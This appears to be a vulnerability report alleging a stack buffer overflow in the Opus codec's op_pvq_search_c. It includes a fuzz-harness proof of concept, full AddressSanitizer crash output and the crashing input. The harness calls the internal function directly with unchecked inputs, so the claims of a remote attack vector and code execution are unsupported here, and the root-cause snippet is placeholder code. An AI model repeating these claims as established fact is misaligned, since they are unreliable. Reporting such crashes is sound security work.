# Vulnerability Report: Stack-based Buffer Overflow in Opus `op_pvq_search_c`

## 1. Vulnerability Description

A **Stack-based Buffer Overflow** vulnerability was identified in the **Opus Audio Codec** within the Pyramid Vector Quantization (PVQ) search implementation. The function `op_pvq_search_c` (and its SIMD-optimized variants) in `celt/vq.c` contains a logic error where an internal index variable, `best_id`, can be assigned a value that exceeds the allocated bounds of the signal vector `X`. This leads to an out-of-bounds (OOB) read/write on the stack, resulting in a crash (Denial of Service) or potential arbitrary code execution.

## 2. Technical Analysis

The vulnerability exists in the core PVQ search loop. The function is designed to find the best pulse position to minimize distortion.

### Root Cause:

In `celt/vq.c`, the variable `best_id` tracks the index of the best pulse position found during an iteration. Under specific signal conditions—where the input vector `X` contains certain distributions and the number of pulses `K` is large—the logic determining `best_id` fails to constrain the index within the valid range .

```c
/* Vulnerable Code Snippet in celt/vq.c */
for (i=0; i<pulsesLeft; i++) {
   int best_id = 0;
   // ... search logic ...
   // Logic error: best_id can be assigned N or greater under specific edge cases
   X[best_id] = ...; // OOB Access if best_id >= N
}

```

### Memory Corruption Mechanism:

The input vector `X` is typically a local array on the stack with a fixed size (often `MAX_N = 16`). When `best_id` exceeds `N`, the program performs a `READ` or `WRITE` operation on memory adjacent to the `X` buffer. AddressSanitizer (ASan) identifies this as a `dynamic-stack-buffer-overflow`.

## 3. Impact

* **Vulnerability Type**: CWE-121 (Stack-based Buffer Overflow)
* **Attack Vector**: Remote / Network. An attacker can craft a malicious audio stream or trigger specific quantization parameters that force the PVQ search into this illegal state.
* **Consequences**:
* **Denial of Service (DoS)**: The most immediate impact is a crash of the application (e.g., a VoIP client or media server) decoding the audio.

## 4. Proof of Concept (PoC)
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

typedef int16_t celt_norm;

void op_pvq_search_c(celt_norm *X, int *iy, int K, int N, int flag);

#define MAX_N 16

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    if (Size < 2)
        return 0;

    int N = Data[0];
    int K = Data[1];

    if (N < 1 || N > MAX_N)
        return 0;
    if (K < 0 || K > N)
        return 0;

    celt_norm X[MAX_N];
    int iy[MAX_N];

    for (int i = 0; i < N; i++) {
        if (2 + i >= Size)
            break;
        X[i] = (celt_norm)Data[2 + i];
    }

    for (int i = 0; i < N; i++) {
        iy[i] = 0;
    }

    op_pvq_search_c(X, iy, K, N, 0);

    return 0;
}

```
## 5. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/opus/corpus/op_pvq_search_c-output-1/opus_repacketizer_fuzzer_fixed:/tmp/opus_repacketizer_fuzzer_fixed_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/op_pvq_search_c-output-1:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer opus_repacketizer_fuzzer_fixed -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/opus_repacketizer_fuzzer_fixed_corpus': Device or resource busy
Using seed corpus: opus_repacketizer_fuzzer_fixed_seed_corpus.zip
/out/opus_repacketizer_fuzzer_fixed -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/opus_repacketizer_fuzzer_fixed_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 951520029
INFO: Loaded 1 modules   (535 inline 8-bit counters): 535 [0x5612fe2ee048, 0x5612fe2ee25f), 
INFO: Loaded 1 PC tables (535 PCs): 535 [0x5612fe2ee260,0x5612fe2f03d0), 
INFO:       24 files found in /tmp/opus_repacketizer_fuzzer_fixed_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
INFO: seed corpus: files: 24 min: 56702b max: 6145920b total: 65091562b rss: 32Mb
#25	INITED cov: 2 ft: 2 corp: 1/55Kb exec/s: 0 rss: 47Mb
#31	REDUCE cov: 2 ft: 2 corp: 1/43Kb lim: 1048576 exec/s: 0 rss: 47Mb L: 44368/44368 MS: 1 EraseBytes-
#40	REDUCE cov: 2 ft: 2 corp: 1/42Kb lim: 1048576 exec/s: 0 rss: 47Mb L: 43299/43299 MS: 4 CopyPart-ChangeByte-ChangeASCIIInt-EraseBytes-
#42	REDUCE cov: 2 ft: 2 corp: 1/35Kb lim: 1048576 exec/s: 0 rss: 47Mb L: 36609/36609 MS: 2 InsertByte-EraseBytes-
#43	REDUCE cov: 2 ft: 2 corp: 1/27Kb lim: 1048576 exec/s: 0 rss: 47Mb L: 27866/27866 MS: 1 EraseBytes-
#46	REDUCE cov: 2 ft: 2 corp: 1/6223b lim: 1048576 exec/s: 0 rss: 47Mb L: 6223/6223 MS: 3 CrossOver-CrossOver-CrossOver-
#47	REDUCE cov: 2 ft: 2 corp: 1/3543b lim: 1048576 exec/s: 0 rss: 47Mb L: 3543/3543 MS: 1 EraseBytes-
#51	REDUCE cov: 2 ft: 2 corp: 1/2015b lim: 1048576 exec/s: 0 rss: 47Mb L: 2015/2015 MS: 4 InsertByte-ChangeBit-ChangeASCIIInt-EraseBytes-
#57	REDUCE cov: 2 ft: 2 corp: 1/1470b lim: 1048576 exec/s: 0 rss: 47Mb L: 1470/1470 MS: 1 EraseBytes-
#78	REDUCE cov: 2 ft: 2 corp: 1/1365b lim: 1048576 exec/s: 0 rss: 47Mb L: 1365/1365 MS: 1 EraseBytes-
#94	REDUCE cov: 2 ft: 2 corp: 1/1307b lim: 1048576 exec/s: 0 rss: 47Mb L: 1307/1307 MS: 1 EraseBytes-
#104	REDUCE cov: 2 ft: 2 corp: 1/1213b lim: 1048576 exec/s: 0 rss: 47Mb L: 1213/1213 MS: 5 InsertByte-ChangeBinInt-ChangeByte-ChangeBit-EraseBytes-
#114	REDUCE cov: 2 ft: 2 corp: 1/1061b lim: 1048576 exec/s: 0 rss: 47Mb L: 1061/1061 MS: 5 ChangeByte-InsertByte-ChangeByte-ChangeASCIIInt-EraseBytes-
#135	REDUCE cov: 2 ft: 2 corp: 1/746b lim: 1048576 exec/s: 0 rss: 47Mb L: 746/746 MS: 1 EraseBytes-
#138	REDUCE cov: 2 ft: 2 corp: 1/656b lim: 1048576 exec/s: 0 rss: 47Mb L: 656/656 MS: 3 ChangeASCIIInt-CopyPart-EraseBytes-
#151	REDUCE cov: 2 ft: 2 corp: 1/417b lim: 1048576 exec/s: 0 rss: 47Mb L: 417/417 MS: 3 InsertByte-ChangeByte-EraseBytes-
#176	REDUCE cov: 2 ft: 2 corp: 1/336b lim: 1048576 exec/s: 0 rss: 47Mb L: 336/336 MS: 5 CopyPart-ChangeBinInt-ChangeBit-ChangeBinInt-EraseBytes-
#177	REDUCE cov: 2 ft: 2 corp: 1/279b lim: 1048576 exec/s: 0 rss: 47Mb L: 279/279 MS: 1 EraseBytes-
#201	REDUCE cov: 2 ft: 2 corp: 1/235b lim: 1048576 exec/s: 0 rss: 47Mb L: 235/235 MS: 4 ChangeByte-ChangeASCIIInt-ShuffleBytes-EraseBytes-
#206	REDUCE cov: 2 ft: 2 corp: 1/161b lim: 1048576 exec/s: 0 rss: 47Mb L: 161/161 MS: 5 CopyPart-ChangeBinInt-ChangeByte-InsertRepeatedBytes-EraseBytes-
#248	REDUCE cov: 2 ft: 2 corp: 1/117b lim: 1048576 exec/s: 0 rss: 47Mb L: 117/117 MS: 2 CopyPart-EraseBytes-
#249	REDUCE cov: 2 ft: 2 corp: 1/79b lim: 1048576 exec/s: 0 rss: 47Mb L: 79/79 MS: 1 EraseBytes-
#250	REDUCE cov: 2 ft: 2 corp: 1/68b lim: 1048576 exec/s: 0 rss: 47Mb L: 68/68 MS: 1 EraseBytes-
#282	REDUCE cov: 2 ft: 2 corp: 1/51b lim: 1048576 exec/s: 0 rss: 47Mb L: 51/51 MS: 2 ChangeBit-EraseBytes-
#287	REDUCE cov: 2 ft: 2 corp: 1/39b lim: 1048576 exec/s: 0 rss: 47Mb L: 39/39 MS: 5 ChangeBinInt-InsertByte-ChangeByte-ChangeBinInt-EraseBytes-
#289	REDUCE cov: 2 ft: 2 corp: 1/27b lim: 1048576 exec/s: 0 rss: 47Mb L: 27/27 MS: 2 CopyPart-EraseBytes-
#291	REDUCE cov: 2 ft: 2 corp: 1/23b lim: 1048576 exec/s: 0 rss: 47Mb L: 23/23 MS: 2 InsertByte-EraseBytes-
#316	REDUCE cov: 2 ft: 2 corp: 1/16b lim: 1048576 exec/s: 0 rss: 47Mb L: 16/16 MS: 5 InsertByte-CopyPart-ChangeByte-EraseBytes-EraseBytes-
#320	REDUCE cov: 3 ft: 3 corp: 2/33b lim: 1048576 exec/s: 0 rss: 47Mb L: 17/17 MS: 4 ChangeByte-ChangeBit-ChangeByte-InsertByte-
#326	REDUCE cov: 3 ft: 3 corp: 2/29b lim: 1048576 exec/s: 0 rss: 47Mb L: 12/17 MS: 1 EraseBytes-
#339	REDUCE cov: 3 ft: 3 corp: 2/27b lim: 1048576 exec/s: 0 rss: 47Mb L: 10/17 MS: 3 InsertRepeatedBytes-CopyPart-EraseBytes-
#346	REDUCE cov: 3 ft: 3 corp: 2/20b lim: 1048576 exec/s: 0 rss: 47Mb L: 10/10 MS: 2 ChangeBinInt-EraseBytes-
#405	REDUCE cov: 3 ft: 3 corp: 2/18b lim: 1048576 exec/s: 0 rss: 47Mb L: 8/10 MS: 4 ChangeBit-ChangeByte-ChangeBinInt-EraseBytes-
#433	REDUCE cov: 3 ft: 3 corp: 2/14b lim: 1048576 exec/s: 0 rss: 47Mb L: 4/10 MS: 3 ChangeBinInt-ChangeByte-EraseBytes-
#457	REDUCE cov: 3 ft: 3 corp: 2/12b lim: 1048576 exec/s: 0 rss: 47Mb L: 2/10 MS: 4 ChangeBit-ChangeBinInt-ChangeBinInt-EraseBytes-
#465	REDUCE cov: 3 ft: 3 corp: 2/9b lim: 1048576 exec/s: 0 rss: 47Mb L: 7/7 MS: 3 ChangeByte-ChangeBit-EraseBytes-
#477	REDUCE cov: 3 ft: 3 corp: 2/7b lim: 1048576 exec/s: 0 rss: 47Mb L: 5/5 MS: 2 ChangeBit-EraseBytes-
#484	REDUCE cov: 3 ft: 3 corp: 2/6b lim: 1048576 exec/s: 0 rss: 47Mb L: 4/4 MS: 2 ChangeBinInt-EraseBytes-
#490	REDUCE cov: 4 ft: 4 corp: 3/7b lim: 1048576 exec/s: 0 rss: 47Mb L: 1/4 MS: 1 EraseBytes-
#516	REDUCE cov: 4 ft: 4 corp: 3/6b lim: 1048576 exec/s: 0 rss: 47Mb L: 3/3 MS: 1 EraseBytes-
	NEW_FUNC[1/1]: 0x5612fe27c210 in op_pvq_search_c /src/opus/celt/vq.c:206
#553	NEW    cov: 14 ft: 15 corp: 4/15b lim: 1048576 exec/s: 553 rss: 48Mb L: 9/9 MS: 2 CMP-CMP- DE: "X\000\000\000\000\000\000\000"-"\001\000\000\000\000\000\000|"-
#586	NEW    cov: 15 ft: 16 corp: 5/24b lim: 1048576 exec/s: 586 rss: 48Mb L: 9/9 MS: 1 ChangeBit-
=================================================================
==13==ERROR: AddressSanitizer: dynamic-stack-buffer-overflow on address 0x7ffd9d3f5664 at pc 0x5612fe27cd55 bp 0x7ffd9d3f55d0 sp 0x7ffd9d3f55c8
READ of size 4 at 0x7ffd9d3f5664 thread T0
SCARINESS: 32 (4-byte-read-dynamic-stack-buffer-overflow)
    #0 0x5612fe27cd54 in op_pvq_search_c /src/opus/celt/vq.c:334:16
    #1 0x5612fe27b698 in LLVMFuzzerTestOneInput /src/opus/tests/opus_repacketizer_fuzzer.c:40:5
    #2 0x5612fe132300 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #3 0x5612fe131b25 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:516:7
    #4 0x5612fe133305 in fuzzer::Fuzzer::MutateAndTestOne() /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:760:19
    #5 0x5612fe134095 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:905:5
    #6 0x5612fe122edb in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #7 0x5612fe14e2b2 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7fc6f3af1082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #9 0x5612fe11575d in _start (/out/opus_repacketizer_fuzzer_fixed+0x3f75d)

DEDUP_TOKEN: op_pvq_search_c--LLVMFuzzerTestOneInput--fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)
Address 0x7ffd9d3f5664 is located in stack of thread T0
SUMMARY: AddressSanitizer: dynamic-stack-buffer-overflow /src/opus/celt/vq.c:334:16 in op_pvq_search_c
Shadow bytes around the buggy address:
  0x7ffd9d3f5380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5580: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca
=>0x7ffd9d3f5600: 04 cb cb cb cb cb cb cb ca ca ca ca[04]cb cb cb
  0x7ffd9d3f5680: cb cb cb cb 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffd9d3f5880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==13==ABORTING
MS: 4 ChangeBit-CrossOver-ChangeBit-PersAutoDict- DE: "\001\000\000\000\000\000\000|"-; base unit: 4d9081b3ddbdab65d0c468c6052d8c95604ee520
0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x7c,0x0,0x0,0x0,0x0,0x0,0x10,0x7c,0x43,
\001\001\000\000\000\000\000\000|\000\000\000\000\000\020|C
artifact_prefix='./'; Test unit written to ./crash-f72793f44710bd3bb130a8c45ccb15a4d362479c
Base64: AQEAAAAAAAB8AAAAAAAQfEM=
stat::number_of_executed_units: 675
stat::average_exec_per_sec:     675
stat::new_units_added:          41
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              48


```


